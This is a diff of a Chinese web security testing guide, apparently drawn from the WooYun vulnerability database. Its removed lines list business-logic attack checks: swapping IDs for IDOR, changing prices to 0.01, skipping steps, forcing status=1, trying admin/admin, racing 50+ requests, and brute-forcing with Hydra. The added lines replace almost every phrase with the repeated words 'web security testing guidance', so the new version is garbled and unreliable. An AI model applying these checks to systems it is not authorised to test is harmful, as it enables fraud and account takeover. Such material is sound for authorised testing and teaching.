-  - 修复建议(短期+长期)
-  - 风险评级(CVSS)
+Phase 4: web security testing guidance
+  - web security testing guidance+web security testing guidance
+  - web security testing guidance+web security testing guidance
+  - web security testing guidance(web security testing guidance+web security testing guidance)
+  - web security testing guidance(CVSS)
 ```
 
-### 6.2 高频漏洞模式速查
+### 6.2 web security testing guidance
 
-| 漏洞模式 | 检测信号 | 快速验证方法 |
+| web security testing guidance | web security testing guidance | web security testing guidance |
 |----------|----------|-------------|
-| IDOR | URL/参数含自增ID | 替换ID看是否返回他人数据 |
-| 金额篡改 | 请求含price/amount | 改为0.01观察订单 |
-| 验证码回显 | 发验证码后抓包 | 搜索响应中4-6位数字 |
-| 步骤跳过 | 多步骤流程 | 直接访问后续步骤URL |
-| 响应篡改 | 客户端根据status跳转 | 改status=1看是否放行 |
-| 未授权后台 | 目录扫描发现管理路径 | 直接访问看是否需要登录 |
-| 弱口令 | 发现登录页 | 尝试admin/admin等默认凭证 |
-| 条件竞争 | 余额/库存/优惠券操作 | 并发50+请求观察是否多扣 |
+| IDOR | URL/web security testing guidanceID | web security testing guidanceIDweb security testing guidance |
+| web security testing guidance | web security testing guidanceprice/amount | web security testing guidance0.01web security testing guidance |
+| web security testing guidance | web security testing guidance | web security testing guidance4-6web security testing guidance |
+| web security testing guidance | web security testing guidance | web security testing guidanceURL |
+| web security testing guidance | web security testing guidancestatusweb security testing guidance | web security testing guidancestatus=1web security testing guidance |
+| web security testing guidance | web security testing guidance | web security testing guidance |
+| web security testing guidance | web security testing guidance | web security testing guidanceadmin/adminweb security testing guidance |
+| web security testing guidance | web security testing guidance/web security testing guidance/web security testing guidance | web security testing guidance50+web security testing guidance |
 
-### 6.3 实战工具推荐
+### 6.3 web security testing guidance
 
-| 工具 | 核心用途 | 适用场景 |
+| web security testing guidance | web security testing guidance | web security testing guidance |
 |------|----------|----------|
-| BurpSuite | 流量拦截、参数篡改、重放 | 全场景核心工具 |
-| Postman | API测试、批量请求 | 接口逻辑测试 |
-| Hydra | 密码爆破 | 弱口令/撞库 |
-| OWASP ZAP | 自动化扫描 | 初步发现 |
-| 自定义脚本 | 并发测试、ID遍历 | 竞争条件/IDOR |
+| BurpSuite | web security testing guidance、web security testing guidance、web security testing guidance | web security testing guidance |
+| Postman | APIweb security testing guidance、web security testing guidance | web security testing guidance |
+| Hydra | web security testing guidance | web security testing guidance/web security testing guidance |
+| OWASP ZAP | web security testing guidance | web security testing guidance |
+| web security testing guidance | web security testing guidance、IDweb security testing guidance | web security testing guidance/IDOR |
 
 ---
 
-*文档版本: v1.0*
-*数据来源: WooYun漏洞库(88,636条): 逻辑缺陷(8,292条)+未授权访问(14,377条)*
-*生成时间: 2026-02-06*
+*web security testing guidance: v1.0*
+*web security testing guidance: WooYunweb security testing guidance(88,636web security testing guidance): web security testing guidance(8,292web security testing guidance)+web security testing guidance(14,377web security testing guidance)*
+*web security testing guidance: 2026-02-06*
